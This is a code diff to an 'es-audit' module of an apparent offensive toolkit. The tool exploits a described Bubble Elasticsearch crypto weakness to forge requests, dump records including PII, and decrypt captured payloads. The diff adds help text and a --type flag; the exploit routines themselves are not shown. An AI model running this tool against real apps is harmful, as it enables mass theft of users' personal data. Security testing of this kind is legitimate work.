@@ -186,24 +186,63 @@ class EsAudit(Module):
     name = "es-audit"
     description = (
         "Bubble Elasticsearch crypto exploit (PBKDF2-MD5x7 + constant IVs "
-        "`po9`/`fl1`). Count, dump, forge, decrypt — the core primitive."
+        "`po9`/`fl1`). Count, dump, forge, decrypt"
     )
     needs_auth = False
     category = "exploit"
     subcommands = (
-        "probe", "analyze", "dumpone <type>", "dumpall",
-        "sqlite [path]",
-        "query <endpoint> '<json>'",
-        "encrypt '<json>' [--appname slug]",
-        "decrypt <y> <x> <z> --appname slug",
+        ("probe", "forge one encrypted /elasticsearch/aggregate call and "
+                  "verify the crypto 0-day works against the target"),
+        ("analyze", "`msearch` every known type once to detect which ones "
+                    "are exposed + classify severity (critical PII vs "
+                    "reference tables)"),
+        ("dumpone <type>", "paginate every record of a single type via "
+                           "/elasticsearch/msearch into a JSONL file"),
+        ("dumpall", "dumpone, but for every type that analyze flagged "
+                    "as readable — requires --confirm"),
+        ("sqlite [path]", "rebuild a SQLite DB from dumpall's JSONL, "
+                          "auto-resolving Bubble __LOOKUP__ joins"),
+        ("query <endpoint> '<json>'", "send an arbitrary JSON payload to "
+                                      "/elasticsearch/<endpoint> (pure crypto "
+                                      "tunnel — good for manual PoCs)"),
+        ("encrypt '<json>' [--appname slug]", "offline: emit the {y, x, z} "
+                                              "triple for the given JSON "
+                                              "(no network call)"),
+        ("decrypt <y> <x> <z> --appname slug", "offline: reverse a captured "
+                                               "triple back to JSON (no "
+                                               "network call)"),
     )
     flags = (
-        "--compare", "--field-leak", "--batch", "--branch test",
-        "--endpoint aggregate|search", "--types t1,t2", "--confirm",
-        "--auth", "--batch-size <N>", "--max <N>",
-        "--appname <slug>", "--sqlite",
+        ("--compare", "analyze: diff anon-reachable types vs "
+                      "authenticated session to surface privacy-rule holes"),
+        ("--field-leak", "analyze: also dump 1 sample record per "
+                         "readable type so field names / PII columns "
+                         "show up in the finding"),
+        ("--batch", "analyze: use /elasticsearch/maggregate (multi-"
+                    "aggregate) instead of /msearch — one request for all "
+                    "types, much faster"),
+        ("--branch test", "target the /version-test/ branch (dev)"),
+        ("--endpoint aggregate|search", "analyze: which ES endpoint to "
+                                        "exploit (default: search)"),
+        ("--type <name>", "analyze / dumpone / sqlite: restrict the "
+                          "operation to a single data type (bypasses the "
+                          "full schema iteration)"),
+        ("--types t1,t2", "analyze / dumpall: restrict the operation to a "
+                          "comma-separated list of types"),
+        ("--confirm", "authorize dumpall — without it the subcommand "
+                      "refuses to run (can exfiltrate GBs)"),
+        ("--auth", "use the current `session` cookies — records the "
+                   "authenticated user can see vs. anon"),
+        ("--batch-size <N>", "dumpone / dumpall: records per page "
+                             "(default: 500)"),
+        ("--max <N>", "dumpone / dumpall: cap the total records pulled "
+                      "per type"),
+        ("--appname <slug>", "override app slug for encrypt / decrypt "
+                             "(default: fingerprint-detected)"),
+        ("--sqlite", "dumpall: also build the SQLite DB at the end "
+                     "(implies `sqlite` subcommand after the dump)"),
     )
-    example = "run es-audit dumpall --confirm --sqlite"
+    example = "run es-audit analyze --type user --field-leak"
 
     async def run(self, ctx: Context, **kwargs: Any) -> None:
         argv: list[str] = kwargs.get("argv", [])
@@ -245,10 +284,20 @@ class EsAudit(Module):
         elif sub == "analyze":
             await self._analyze(ctx, anon, auth, app_version, flags)
         elif sub == "dumpone":
-            if len(positional) < 2:
-                console.print("[red]usage:[/] run es-audit dumpone <type>")
+            # Accept either a positional type or `--type <name>` — the flag
+            # form keeps dumpone consistent with analyze / dumpall / sqlite.
+            type_name: Optional[str] = None
+            if len(positional) >= 2:
+                type_name = positional[1]
+            elif isinstance(flags.get("type"), str):
+                type_name = str(flags["type"]).strip() or None
+            if not type_name:
+                console.print(
+                    "[red]usage:[/] run es-audit dumpone <type>  "
+                    "(or --type <name>)"
+                )
                 return
-            await self._dumpone(ctx, anon, auth, app_version, positional[1], flags)
+            await self._dumpone(ctx, anon, auth, app_version, type_name, flags)
         elif sub == "dumpall":
             if not flags.get("confirm"):
                 console.print(
@@ -460,17 +509,24 @@ class EsAudit(Module):
         app_version: str,
         flags: dict[str, Any],
     ) -> None:
-        types = sorted(ctx.schema.types.keys())
+        # Resolve the target type list. Priority:
+        #   1. `--type <name>` — single-type mode (most common for focused audits).
+        #   2. `--types a,b,c` — comma-separated subset.
+        #   3. all types in ctx.schema.
+        explicit_one = flags.get("type")
+        explicit_many = flags.get("types")
+        if isinstance(explicit_one, str) and explicit_one.strip():
+            types = [explicit_one.strip()]
+        elif isinstance(explicit_many, str) and explicit_many.strip():
+            types = [t.strip() for t in explicit_many.split(",") if t.strip()]
+        else:
+            types = sorted(ctx.schema.types.keys())
         if not types:
             console.print(
-                "[yellow]No types in schema.[/] Run `run datatypes` first "
-                "(or use `run es-audit analyze --types type1,type2`)."
+                "[yellow]No types available.[/] Run `run datatypes` first, or "
+                "pass `--type <name>` / `--types a,b,c` explicitly."
             )
-            explicit = flags.get("types")
-            if isinstance(explicit, str):
-                types = [t.strip() for t in explicit.split(",") if t.strip()]
-            if not types:
-                return
+            return
 
         compare = bool(flags.get("compare")) and auth is not None
         field_leak = bool(flags.get("field_leak"))
@@ -794,7 +850,14 @@ class EsAudit(Module):
         app_version: str,
         flags: dict[str, Any],
     ) -> None:
-        types = sorted(ctx.schema.types.keys())
+        explicit_one = flags.get("type")
+        explicit_many = flags.get("types")
+        if isinstance(explicit_one, str) and explicit_one.strip():
+            types = [explicit_one.strip()]
+        elif isinstance(explicit_many, str) and explicit_many.strip():
+            types = [t.strip() for t in explicit_many.split(",") if t.strip()]
+        else:
+            types = sorted(ctx.schema.types.keys())
         if not types:
             console.print("[yellow]No types in schema.[/] Run `run datatypes` first.")
             return
@@ -860,6 +923,16 @@ class EsAudit(Module):
         stats: list[dict[str, Any]] = []
 
         jsonl_files = sorted(dump_dir.glob("*.jsonl"))
+        one_type = flags.get("type")
+        if isinstance(one_type, str) and one_type.strip():
+            wanted = one_type.strip().lower()
+            jsonl_files = [f for f in jsonl_files if f.stem.lower() == wanted]
+            if not jsonl_files:
+                console.print(
+                    f"[yellow]No dump for type[/] [cyan]{wanted}[/]. "
+                    "Run `es-audit dumpone <type>` first."
+                )
+                return
         from bubblepwn.ui import progress_iter
         with progress_iter("Importing JSONL", len(jsonl_files)) as bar:
             for f in jsonl_files:
